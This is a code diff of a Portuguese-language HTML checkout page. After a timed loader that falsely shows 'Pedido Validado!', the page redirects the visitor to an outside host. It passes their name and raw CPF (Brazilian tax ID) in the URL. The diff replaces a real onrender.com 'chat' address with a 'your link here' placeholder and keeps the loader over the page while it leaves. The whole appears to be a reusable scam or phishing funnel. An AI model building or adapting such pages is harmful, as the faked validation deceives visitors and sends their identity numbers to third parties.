@@ -1191,20 +1191,24 @@
                 setTimeout(() => {
                     setLoaderStep(2, 'Pedido Validado!');
                     
+                    // Redirecionamento imediato após a conclusão visual do loader para evitar flash da página principal
                     setTimeout(() => {
                         const currentParams = new URLSearchParams(window.location.search);
                         currentParams.set('nome', name);
                         currentParams.set('cpf', cpfRaw);
                         
-                        // Redireciona para o link de exemplo mantendo todos os parâmetros originais + nome e cpf
-                        const redirectUrl = `https://veja-gasdisk.onrender.com/chat5/?${currentParams.toString()}`;
+                        const redirectUrl = `https://seulinkaqui.com/?${currentParams.toString()}`;
                         
-                        // Reset do loader antes de sair (caso o usuário volte)
-                        loader.classList.remove('active');
-                        document.body.style.overflow = '';
-                        
+                        // Executa o redirecionamento mantendo o loader ativo na tela
                         window.location.href = redirectUrl;
-                    }, 800);
+                        
+                        // Agenda o reset do loader para um tempo depois, apenas para o caso do usuário clicar em "voltar"
+                        // Isso garante que o loader permaneça cobrindo a página original durante o redirecionamento
+                        setTimeout(() => {
+                            loader.classList.remove('active');
+                            document.body.style.overflow = '';
+                        }, 1000);
+                    }, 600);
                 }, 2000);
 
             } catch (err) {
@@ -1216,7 +1220,7 @@
             }
         }
 
-        // Proteção extra para resetar o loader se o usuário voltar à página
+        // Proteção para resetar o loader se o usuário voltar à página
         window.addEventListener('pageshow', (event) => {
             if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
                 const loader = document.getElementById('global-loader');
@@ -1406,5 +1410,6 @@
             if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
         });
     </script>
+
 </body>
 </html>
